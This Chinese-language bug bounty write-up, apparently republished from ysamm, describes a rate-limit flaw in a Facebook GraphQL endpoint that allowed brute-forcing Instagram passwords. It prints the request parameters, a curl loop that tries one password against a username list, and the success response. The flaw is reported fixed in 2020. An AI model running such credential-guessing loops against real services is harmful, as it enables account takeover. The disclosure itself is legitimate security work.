![](https://image.3001.net/images/20200320/1584686113_5e746421c3838.jpg!small)

**今天分享的这篇Writeup关于速率限制问题（请求次数限制，Rate
Limitation），这也是面向公众网站的设计中常常会忽略掉的防护措施，利用速率限制漏洞可以实现对网站注册用户名、密码等账户信息的批量枚举。这里的速率限制漏洞存在于Facebook验证Instagram用户访问某个管理接口的GraphQL请求中，攻击者利用该漏洞可以暴力枚举Instagram注册用户的密码。漏洞最终获得了Facebook官方$3000奖励。**

##  漏洞概况

在Facebook与Instagram的某项应用交互中，Instagram用户通过内置GraphQL请求跳转到某个管理界面，在此期间，Facebook会对用户身份做校验。起初看来，该请求服务端与客户端用户的多个交互请求都是通过用户名username来做身份认证的，然而经测试发现，如果在请求中用不同的用户名和密码组合匹配，都能获取到Instagram后端对密码正确性的有效响应，且无任何速率限制措施，为此，我们可以利用该漏洞，对Instagram用户的密码实施枚举。

##  漏洞复现

附带以下参数，向接口<https://www.facebook.com/api/graphql>执行POST请求（无需Cookie）：

    
    
    __a=1
    
        doc_id=REDACTED&
    
        variables={"data":{"business_id":BUSINESS_ID,"page_id":PAGE_ID,"username":"USERNAME","password":"PASSWORD"}}

其中的BUSINESS_ID 和 PAGE_ID都是代表事务处理和页面调用的随机id数，
USERNAME为目标Instagram账户的用户名，PASSWORD为我们要枚举测试的密码字段。接下来，用curl方式，选定一个密码（这里以23456为例）匹配用户名字典USER_LIST，对上述Facebook接口发起请求：

    
    
    while read user; do curl -k -i -X POST <https://www.facebook.com/api/graphql/> -H 'Content-Type: application/x-www-form-urlencoded' -d "__a=1&doc_id=REDACTED&variables={\"data\":{\"business_id\":RANDOM,\"page_id\":RANDOM,\"username\":\"$user\",\"password\":\"123456\"}}";done < USER_LIST

如果最终的密码和用户名组合在上述接口的校验过程中成功，则Facebook后端会返回以下有效响应信息：

    
    
    (
    
        "cm_ig_authentication": {
    
        "is_authenticated": true
    
        } )

##  漏洞影响

由于在上述接口请求中无速率限制措施（客户端用户的请求次数限制），因此利用上述请求，恶意攻击者可以构建大规模Instagram用户字典，通过不同的密码匹配，实施对任意Instagram用户的密码猜解枚举。

##  漏洞修复

Facebook在上述接口请求中，对“username” 和 “password”字段加入了速率限制措施。

##  漏洞上报和处理进程

> 2020.2.4 — 漏洞初报
>
> 2020.2.11 — Facebook确认漏洞
>
> 2020.3.9 — Facebook修复漏洞
>
> 2020.3.10 — Facebook奖励$3000

***参考来源：[ysamm](https://ysamm.com/?p=396)，clouds 编译整理，转载请注明来自 FreeBuf.COM**

  

